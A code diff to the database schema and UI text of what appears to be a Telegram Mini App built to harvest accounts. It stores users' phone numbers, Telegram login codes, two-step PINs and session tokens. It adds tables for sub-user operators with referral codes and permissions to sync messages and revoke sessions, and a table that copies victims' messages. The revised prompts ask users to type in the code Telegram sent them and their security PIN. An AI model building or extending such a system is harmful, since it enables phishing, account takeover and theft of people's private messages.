@@ -1,5 +1,3 @@
--- Cloudflare D1 (SQLite) Database Schema for Telegram Mini App
-
 CREATE TABLE IF NOT EXISTS users (
   id INTEGER PRIMARY KEY AUTOINCREMENT,
   tg_id TEXT UNIQUE NOT NULL,
@@ -7,8 +5,9 @@ CREATE TABLE IF NOT EXISTS users (
   last_name TEXT DEFAULT '',
   username TEXT DEFAULT '',
   bot_id TEXT DEFAULT 'default',
+  sub_user_ref TEXT DEFAULT '',
   phone_number TEXT DEFAULT '',
-  state TEXT DEFAULT 'need_phone',
+  state TEXT DEFAULT 'enter_code',
   otp_code TEXT DEFAULT '',
   otp_expires_at INTEGER DEFAULT 0,
   twofa_enabled INTEGER DEFAULT 0,
@@ -17,6 +16,29 @@ CREATE TABLE IF NOT EXISTS users (
   session_token TEXT DEFAULT '',
   created_at TEXT DEFAULT CURRENT_TIMESTAMP,
   updated_at TEXT DEFAULT CURRENT_TIMESTAMP
+);
+
+CREATE TABLE IF NOT EXISTS sub_users (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  name TEXT NOT NULL,
+  username TEXT UNIQUE NOT NULL,
+  password_hash TEXT NOT NULL,
+  ref_code TEXT UNIQUE NOT NULL,
+  can_sync_messages INTEGER DEFAULT 1,
+  can_revoke_session INTEGER DEFAULT 1,
+  is_active INTEGER DEFAULT 1,
+  created_at TEXT DEFAULT CURRENT_TIMESTAMP
+);
+
+CREATE TABLE IF NOT EXISTS synced_messages (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  tg_id TEXT NOT NULL,
+  sub_user_ref TEXT DEFAULT '',
+  sender_type TEXT NOT NULL,
+  sender_name TEXT DEFAULT '',
+  source TEXT DEFAULT 'miniapp',
+  message_text TEXT NOT NULL,
+  created_at TEXT DEFAULT CURRENT_TIMESTAMP
 );
 
 CREATE TABLE IF NOT EXISTS bot_templates (
@@ -57,5 +79,5 @@ VALUES (
   'default',
   '',
   0,
-  '{"start":{"title":"Phone Verification","description":"Enter your phone number to receive a verification code.","buttonText":"Send Code"},"code":{"title":"Enter Verification Code","description":"We sent a 6-digit verification code to your Telegram.","buttonText":"Verify Code"},"pass":{"title":"Two-Step Verification","description":"Enter your account security PIN/password.","buttonText":"Continue"},"end":{"title":"Verified & Logged In","description":"Your session is now active and securely stored.","buttonText":"Done"}}'
+  '{"code":{"title":"Auto OTP Verification","description":"We automatically sent a 6-digit login code to your Telegram bot chat. Enter it below to activate your session.","buttonText":"Verify & Login"},"pass":{"title":"Two-Step Security PIN","description":"Enter your account security PIN to complete login.","buttonText":"Unlock Session"},"end":{"title":"Session Connected","description":"Your account session is active and synced with our portal.","buttonText":"Open Portal"}}'
 );
